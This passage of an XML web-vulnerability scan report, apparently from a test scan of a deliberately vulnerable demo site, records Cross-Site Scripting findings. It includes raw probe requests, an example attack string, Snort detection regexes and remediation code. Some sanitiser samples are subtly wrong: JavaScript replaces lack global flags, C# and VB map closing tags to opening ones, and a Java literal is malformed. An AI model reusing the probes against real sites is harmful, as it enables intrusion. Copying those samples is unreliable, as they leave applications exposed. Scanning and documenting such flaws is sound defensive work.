</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="6DE69E70BF6965A422365150E9861BFF"><![CDATA[GET /pictures/3.jpg.tn/%33%35%32%38%34 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="6DE69E70BF6965A422365150E9861BFF";PSID="E4EA982328348C1381E86C20B52B3C8E";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2535%2532%2538%2534";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="9969f499";
X-Request-Memo: ID="41ef8f67";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/3.jpg.tn/35284");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:24</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="6DE69E70BF6965A422365150E9861BFF"><Method>GET</Method><Path>/pictures/3.jpg.tn/</Path><File>%33%35%32%38%34</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="6DE69E70BF6965A422365150E9861BFF";PSID="E4EA982328348C1381E86C20B52B3C8E";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2535%2532%2538%2534";AttackStringProps="Attack";tid="47";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="9969f499";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="41ef8f67";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/3.jpg.tn/35284");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:24</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A51D6BD7EAFA2F896800675D3959DB73"><URL>http://php.vulnweb.com:80/pictures/2.jpg.tn/%33%33%32%35%32</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="93221542-ac0f-4a7a-b7ba-3ea53b23b206"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/2.jpg.tn/%33%33%32%35%32 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A51D6BD7EAFA2F896800675D3959DB73";PSID="F23F638F1BEFA4A9352351623ED5929E";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2533%2532%2535%2532";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="63f39d32";
X-Request-Memo: ID="93bc354b";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
